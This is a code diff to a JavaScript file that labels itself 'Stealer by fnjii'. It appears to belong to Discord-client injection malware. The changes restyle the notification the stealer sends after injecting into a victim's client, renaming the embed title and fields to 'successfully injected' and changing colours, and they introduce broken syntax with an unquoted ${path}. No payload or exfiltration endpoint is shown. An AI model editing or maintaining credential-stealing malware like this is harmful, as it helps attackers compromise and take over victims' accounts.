@@ -13,7 +13,7 @@ const config = {
     "inject-notify": "true",
     "logout-notify": "true",
     "init-notify":"true",
-    "embed-color": 3447704,
+    "embed-color": 000000,
     "disable-qr-code": "true"
 }
 
@@ -159,8 +159,8 @@ function injectNotify() {
     var fields = [];
     injectPath.forEach( path => {
         var c = {
-            name: ":syringe: Inject Path",
-            value: `\`\`\`${path}\`\`\``,
+            name: ":lock: **successfully injected**",
+            value: ${path},
             inline: !1
         }
         fields.push(c)
@@ -170,8 +170,8 @@ function injectNotify() {
         "content": null,
         "embeds": [
           {
-            "title": ":detective: Successfull injection",
-            "color": config["embed-color"],
+            "title": ":lock: ",
+            "color": 000000,
             "fields": fields,
             "author": {
               "name": "Stealer by fnjii"
@@ -189,4 +189,3 @@ function injectNotify() {
     })
 
 }
-
